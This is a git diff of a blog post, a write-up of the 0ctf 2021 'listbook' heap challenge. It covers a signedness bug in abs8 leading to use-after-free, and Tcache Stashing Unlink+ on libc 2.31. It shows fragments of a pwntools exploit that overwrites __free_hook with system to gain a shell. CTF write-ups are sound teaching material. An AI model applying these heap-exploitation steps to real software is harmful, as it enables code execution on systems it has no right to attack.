@@ -3,7 +3,7 @@ title: 0ctf 2021 listbook
 date: 2022-01-07T10:40:20.642Z
 draft: false
 featured: true
-tags: []
+tags: ["pwn", libc-2.31", "tcache-stashing-unlink-plus"]
 categories: []
 image:
   filename: b2b46a3ab8e563d35bb7d38c8cc18091.png
@@ -13,26 +13,26 @@ image:
 ---
 # 0ctf 2021
 
-CTF : https://ctftime.org/event/1356 <br>
+>CTF : https://ctftime.org/event/1356 <br>
 Challenge : https://ctftime.org/writeup/29118 <br>
 Points: 154 <br>
 
 # Checksec
-
-```yaml
+```
+{{< highlight yaml >}}
 Arch:     amd64-64-little
 RELRO:    Full RELRO
 Stack:    Canary found
 NX:       NX enabled
 PIE:      PIE enabled
 RUNPATH:  './'
+{{< / highlight >}}
 ```
-
 # Overview
 
 It's a classic `libc 2.31` heap challenge
-
-```ags
+```
+{{< highlight ags >}}
  _     _     _   ____              _    
 | |   (_)___| |_| __ )  ___   ___ | | __
 | |   | / __| __|  _ \ / _ \ / _ \| |/ /
@@ -45,6 +45,7 @@ It's a classic `libc 2.31` heap challenge
 3.show
 4.exit
 >>
+{{< / highlight >}}
 ```
 
 As shown in the options we can add , delete and show heap notes. Lets look at these functions in IDA now
@@ -185,29 +186,20 @@ Lets give "A" as our name and hit breakpoint at 0x138f
 So everything is fine here right?. I bruteforced all values from 0x0 to 0xff and checked the returned value from the `gen_hash` function and saw something weird. Now lets give our `note->name` as "\x80"
 ![enter image description here](https://imgur.com/3cgsgFO.png) <br> Lets see the disassembly of `abs8()`. <br> So `al` is being right shifted by 7 and since `al` is being used instead of `eax` there is a signedness issue here. Lets follow the operations after the `sar` instruction
 
-```c
+{{< code language="nasm" title="abs8 disassembly" id="1" isCollapsed="false" >}}
 .text:000000000000138F ; 9:   sum = abs8(tmp);
-.text:000000000000138F                 movzx   eax, [rbp+tmp];
+.text:000000000000138F                 movzx   eax, [sum];
 .text:0000000000001393                 sar     al, 7; eax = 0x80 (before shift)
 .text:0000000000001396                 mov     edx, eax; eax = 0xff 
 .text:0000000000001398                 mov     eax, edx; edx = 0xff 
-.text:000000000000139A                 xor     al, [rbp+tmp]; al {0xff} ^ [rbp+tmp] {0x80}
-.text:000000000000139D                 sub     eax, edx; eax = 0x7f edx = 0xff
-.text:000000000000139F                 mov     [rbp+tmp], eax; eax = 0xffffff80
+.text:000000000000139A                 xor     al, [sum]; {al:=0xff} ^ {sum:=0x80}
+.text:000000000000139D                 sub     eax, edx; 0x7f-0xff
+.text:000000000000139F                 mov     [sum], eax; eax = 0xffffff80
 .text:00000000000013A2 ; 10:   if ( sum > 15 ) [false]
-.text:00000000000013A2                 cmp     [rbp+tmp], 0Fh
+.text:00000000000013A2                 cmp     [sum], 0Fh
 .text:00000000000013A6                 jle     short return_hash
-.text:00000000000013A8 ; 11:     sum %= 16;
-.text:00000000000013A8                 movzx   eax, [rbp+tmp]
-.text:00000000000013AC                 mov     edx, eax
-.text:00000000000013AE                 sar     dl, 7
-.text:00000000000013B1                 shr     dl, 4
-.text:00000000000013B4                 add     eax, edx
-.text:00000000000013B6                 and     eax, 0Fh
-.text:00000000000013B9                 sub     eax, edx
-.text:00000000000013BB                 mov     [rbp+tmp], al
 .text:00000000000013BE ; 12:   return sum; ; sum = 0xffffff80 :)) 
-```
+{{< /code >}}
 
 So there are two bugs. 
 
@@ -236,7 +228,7 @@ pwndbg> x/gx $in_use
 1. Use name "\x80" to trigger UAF in chunk idx 0 and 1.
 2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.<br>
 
-```python
+{{< code language="python" title="exploit" id="2" isCollapsed="true" >}}
 #!/usr/bin/env python3.9
 # -*- coding: utf-8 -*-
 __MODE__ ="PWN"
@@ -366,4 +358,4 @@ add(b"\x00", p(libc.sym['system'])) # overwrite __free_hook
 delete(2)
 
 io.interactive()
-```
+{{< /code >}}
